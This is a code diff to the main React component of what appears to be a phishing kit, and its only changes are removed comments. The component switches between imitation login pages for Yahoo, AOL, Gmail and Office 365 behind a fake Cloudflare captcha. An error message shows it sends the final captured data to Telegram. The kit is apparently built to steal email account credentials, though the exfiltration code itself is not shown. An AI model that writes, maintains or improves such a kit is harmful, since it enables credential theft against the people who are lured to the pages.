@@ -5,7 +5,7 @@ import YahooLoginPage from './components/YahooLoginPage';
 import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage';
 import AolLoginPage from './components/AolLoginPage';
 import GmailLoginPage from './components/GmailLoginPage';
-import Office365Wrapper from './components/Office365Wrapper'; // Import the wrapper
+import Office365Wrapper from './components/Office365Wrapper';
 import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
@@ -38,7 +38,7 @@ function App() {
   const [showYahooLogin, setShowYahooLogin] = useState(false);
   const [showAolLogin, setShowAolLogin] = useState(false);
   const [showGmailLogin, setShowGmailLogin] = useState(false);
-  const [showOffice365Login, setShowOffice365Login] = useState(false); // State for Office 365
+  const [showOffice365Login, setShowOffice365Login] = useState(false);
 
   useEffect(() => {
     const checkMobile = () => setIsMobile(window.innerWidth <= 768);
@@ -52,7 +52,6 @@ function App() {
       if (event.name === 'adobe_session' || event.name === 'logged_in') {
         const isActive = event.action !== 'remove' && event.value && event.value !== 'false';
         setHasActiveSession(isActive);
-        // Reset all specific login states
         setShowYahooLogin(false);
         setShowAolLogin(false);
         setShowGmailLogin(false);
@@ -115,7 +114,6 @@ function App() {
       console.error('Failed to send final data to Telegram:', error);
     }
     
-    // Reset all specific login states
     setShowYahooLogin(false);
     setShowAolLogin(false);
     setShowGmailLogin(false);
@@ -130,7 +128,6 @@ function App() {
     config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
     setHasActiveSession(false);
     setCaptchaVerified(false);
-    // Reset all specific login states
     setShowYahooLogin(false);
     setShowAolLogin(false);
     setShowGmailLogin(false);
@@ -138,7 +135,6 @@ function App() {
     setCurrentPage('captcha');
   };
 
-  // Handlers for each provider
   const handleYahooSelect = () => setShowYahooLogin(true);
   const handleAolSelect = () => setShowAolLogin(true);
   const handleGmailSelect = () => setShowGmailLogin(true);
@@ -178,7 +174,7 @@ function App() {
         onYahooSelect={handleYahooSelect}
         onAolSelect={handleAolSelect}
         onGmailSelect={handleGmailSelect}
-        onOffice365Select={handleOffice365Select} // This prop is now passed correctly
+        onOffice365Select={handleOffice365Select}
         onBack={() => { setCaptchaVerified(false); setCurrentPage('captcha'); }}
         onLoginSuccess={handleLoginSuccess}
         onLoginError={error => console.error('Login error:', error)}
